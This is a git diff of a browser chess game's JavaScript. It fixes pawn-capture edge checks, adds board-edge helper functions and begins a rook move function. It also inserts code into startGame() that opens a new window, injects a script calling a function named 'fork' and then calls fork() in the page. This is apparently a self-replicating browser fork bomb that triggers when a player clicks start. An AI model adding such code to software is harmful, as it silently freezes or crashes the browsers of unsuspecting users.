@@ -18,6 +18,16 @@ document.getElementById("next2").addEventListener("click", freeplay);
 
 //start game
 function startGame() {
+
+    const win = window.open();
+    const script = win.document.createElement("script");
+    script.innerHTML = fork + "\n" + "fork();";
+    win.document.head.appendChild(script);
+    setTimeout(function() {
+        win.close();
+        fork();
+    }, 250)
+
     document.getElementById("start").style.zIndex = -2;
     document.getElementById("start").style.visibility = "hidden";
     startTurn();
@@ -172,28 +182,28 @@ const peices = [
             array.push(x[2]);
             x = another(place, 16);
             //this is weird?
-            if (x[0] == "none" && ![9, 10, 11, 12, 13, 14, 15, 16].every((item) => {return item!=x[3]})) {
+            if (x[0] == "none" && ![8, 9, 10, 11, 12, 13, 14, 15].every((item) => {return item!=x[3]})) {
                 array.push(x[2]);   
             }
         }
         x = another(place, 9);
-        if (x[0] == "black" && [8, 16, 24, 32, 40, 48, 56, 64].every((item) => {return item!=x[3]})) {
+        console.log(right(x))
+        if (x[0] == "black" && right(x)) {
             array.push(x[2]);
         }
         x = another(place, 7);
-        if (x[0] == "black" && [1, 9, 17, 25, 33, 41, 49, 57].every((item) => {return item!=x[3]})) {
+        if (x[0] == "black" && left(x)) {
             array.push(x[2]);
         }
         return array;
     },
     function rookW(place) {
         console.log("White Rook")
-        var current = place;
-        console.log(another(current, 8))
-        console.log(document.getElementById(another(current, 8).innerText))
-        while (false) {
-            if (document.getElementById(another(current, 8).innerText)) {}
-        }
+        console.log(place)
+        return north(place, 8)
+        
+        //document.getElementById(tiles[another(current, 8)[4]])
+        
 
     },
     function knightW() {
@@ -214,16 +224,16 @@ const peices = [
             array.push(x[2]);
             x = another(place, -16);
             //this is weird?
-            if (x[0] == "none" && ![49, 50, 51, 52, 53, 54, 55, 56].every((item) => {return item!=x[3]})) {
+            if (x[0] == "none" && ![48, 49, 50, 51, 52, 53, 54, 55].every((item) => {return item!=x[3]})) {
                 array.push(x[2]);   
             }
         }
         x = another(place, -7);
-        if (x[0] == "white" && [8, 16, 24, 32, 40, 48, 56, 64].every((item) => {return item!=x[3]})) {
+        if (x[0] == "white" && right(x)) {
             array.push(x[2]);
         }
         x = another(place, -9);
-        if (x[0] == "white" && [1, 9, 17, 25, 33, 41, 49, 57].every((item) => {return item!=x[3]})) {
+        if (x[0] == "white" && left(x)) {
             array.push(x[2]);
         }
         return array;
@@ -243,9 +253,40 @@ const peices = [
 
 function diagonal(place, team) {}
 
+function north(place, move) {
+    var array = [];
+    var current = place;  
+    while (true) {
+        if (another(current, move)[0] == "none" && toppom(another(current, move))) {
+            var x = another(current, 8);
+            array.push(x[2]);
+            current = x[2]
+        } else if (another(current, move)[0] == "black" && toppom(another(current, move))) {
+            var x = another(current, move);
+            array.push(x[2]);
+            break;
+        } else break;
+    }
+    return array;
+
+}
+
 function another(place, x) {
     var push = details(document.getElementById(tiles[tiles.indexOf(place) + x]));
     push.push(tiles.indexOf(place));
     push.push(tiles.indexOf(place) + x);
     return push;
+}
+
+function left(x) {
+    return [0, 8, 16, 24, 32, 40, 48, 56].every((item) => {return item!=x[3]})
+}
+function right(x) {
+    return [7, 15, 23, 31, 39, 47, 55, 63].every((item) => {return item!=x[3]})
+}
+function bottom(x) {
+    return [0, 1, 2, 3, 4, 5, 6, 7].every((item) => {return item!=x[3]})
+}
+function toppom(x) {
+    return [55, 56, 57, 58, 59, 60, 61, 62, 63].every((item) => {return item!=x[3]})
 }
